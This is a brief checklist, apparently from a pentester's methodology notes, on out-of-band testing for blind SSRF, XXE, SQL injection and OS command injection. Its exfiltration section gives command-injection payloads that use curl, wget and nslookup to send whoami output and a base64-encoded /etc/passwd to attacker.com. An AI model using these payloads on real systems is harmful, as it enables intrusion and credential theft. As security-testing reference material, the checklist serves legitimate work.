---
title: "Out-of-Band (OOB) Attacks"
tags: [methodology, oob]
summary: "OOB testing for blind vulnerabilities — SSRF, XXE, SQLi, and command injection when there's no visible response. Covers injection vectors and data exfiltration."
draft: false
---

## 1. Discovery
- [ ] Use OOB testing when the application is entirely blind (no error messages, no time delays, no visible differences in output).
- [ ] Spin up a Burp Collaborator payload or use a tool like Interactsh/Webhook.site.

## 2. Injection Vectors
- [ ] **Blind SSRF**: Submit the OOB URL into any parameter that might fetch a remote resource.
- [ ] **Blind XXE**: Use an external DTD pointing to your OOB URL.
- [ ] **Blind SQLi**: Inject DNS lookup commands specific to the database (e.g., `LOAD_FILE` in MySQL, `xp_dirtree` in MSSQL).
- [ ] **Blind OS Command Injection**: Inject `curl` or `ping` commands to your OOB URL (`; curl http://attacker.com/$(whoami) ;`).

## 3. Exfiltration
- [ ] Since you can't see the response, force the target server to append the sensitive data to the OOB request.
- [ ] Example (Linux): `wget http://attacker.com/?data=$(cat /etc/passwd | base64)`
- [ ] Example (DNS): `nslookup $(whoami).attacker.com`
